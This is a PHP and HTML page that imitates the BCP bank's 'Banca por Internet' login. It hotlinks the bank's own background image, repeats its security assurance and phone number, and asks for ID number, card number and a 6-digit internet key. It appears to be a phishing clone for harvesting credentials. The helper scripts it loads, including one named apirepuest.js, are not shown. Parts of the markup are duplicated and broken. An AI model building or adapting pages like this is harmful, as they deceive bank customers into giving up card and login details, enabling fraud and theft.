<?php
session_start();

if (isset($_POST['submit'])) {
    // Verificar el valor del captcha
    if ($_POST['captcha_code'] == $_SESSION["captcha_code"]) {
        $message = '<p id="msg">correco</p>';
    } else {
        // Captcha es incorrecto
        $message = '<p id="msg">Incorrecto</p>';
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    <link rel="stylesheet" type="text/css" href="css/style.css">
    <link rel="stylesheet" type="text/css" href="css/password.css">


    <title>BancaPorInternet</title>
</head>

<body>
    <div class="container-fluid  sinpadding">
        <img class="fondo_img" src="https://bpi.azureedge.net/assets-1-0-0/images/login/bpi_bg.jpg?hgD5A-IC=" alt="">
        <div div class="img-log"></div>
        <div class="row m-altura">
        </div>
        <div class="col-md-6">

            <h3 class="fw-bold text-center pt-5 mb-5 color-titulo">Banca por Internet</h3>


                <h3 class="fw-bold text-center pt-5 mb-5 color-titulo">Banca por Internet</h3>
                <!-- Formulario -->
                <form action="#" method="post" novalidate class="form-padre" id="formulario">
                    <div class="opciones">

                        <label class="radio">
                            <input type="radio" name="bcp" id="Green" id="persona" value="personas" checked> Persona
                            <span></span>
                        </label>
                        <label class="radio">
                            <input type="radio" name="bcp" id="Green" id="empresa" value="empresas"> Empresa
                            <span></span>
                        </label>

                    </div>
                    <div class="Documentos">
                        <select name="DNI" id="documentos form-control" class="form-select selec-docu select">
                            <option value="1">DNI</option>
                            <option value="2">CE</option>
                            <option value="3">PAS</option>
                        </select>

                        <input type="text" class="form-control ancho-input" name="numeroDocumento" id="docu" placeholder="Nro de documento">

                    </div>




                    <label class="radio">
                        <input type="radio" name="bcp"  id="persona" value="personas" checked> Persona
                        <span></span>
                    </label>
                    <label class="radio">
                        <input type="radio" name="bcp"  id="empresa" value="empresas"> Empresa
                        <span></span>

                    </label>

                </div>
                <div class="Documentos">
                    <select name="DNI" id="documentos form-control" class="form-select selec-docu select">
                        <option value="1">DNI</option>
                        <option value="2">CE</option>
                        <option value="3">PAS</option>
                    </select>


                    <input type="text" class="form-control ancho-input" name="numDocumento" id="docu"
                        placeholder="Nro de documento">

                </div>


                <div class="mb-4">
                    <label for="numeroTarjeta" class="form-label">Número de tarjeta</label>
                    <input type="text" class="form-control ancho2-input label-input" name="numeroTarjeta"
                        id="numeroTarjeta" required>
                        
                </div>


                <div class="mb-4 ">
                    <input type="checkbox" id="recordar" name="recordar" class="colorcheck">
                    <label for="recordar" class="form-check-label">Recordar datos</label>

                </div>
                <div class="mb-4">
                    <label for="Clave" class="form-label">Clave de internet de 6 dígitos</label>
                    <input type="text" class="form-control ancho2-input label-input" autocomplete="off" readonly
                        id="clave" name="Clave">
                </div>

                <div class="button-container">
                    <a href="#" class="linea1">No tengo clave</a>
                    <a href="#" class="linea1">Olvide mi clave</a>
                </div>
                <div class="form-group mt-2">
                    <img src="captcha_gen.php" />

                    <input type="text" name="captcha_code" class="form-control" autocomplete="off"
                        placeholder="Código" />
                    <a href="" class="linea1" id="cl">Cambiar</a>

                    <?php
                    if (isset($message)) {
                        echo $message;
                    }

                    session_unset();
                    ?>
                </div>

                <div mt-10>
                    <input type="submit" name='submit' value="Continuar" id="st" class="botoncontinuar" />

                    <p id="show" style="text-align:center;">
                </div>

                <div>
                    <p class="texto">

                        <i class="bi bi-lock"></i> Esta es una página segura del BCP. Si tienes dudas sobre la
                        autenticidad de la web, comunícate
                        con nosotros al 311-9898 o a través de nuestros medios digitales.
                    </p>
                </div>
            </form>
        </div>
    </div>
    </div>
    <script>
        $(document).ready(function () {
            $("#st").on('click', function () {
                $("#msg").css('display', 'block');

            });
            $("#cl").on('click', function () {

                location.reload();
            });
        });
    </script>
    <script src="js/main.js"></script>
    <script src="js/input.js"></script>
    <script src="js/clave.js"></script>
    <script src="js/apirepuest.js"></script>


</body>

</html>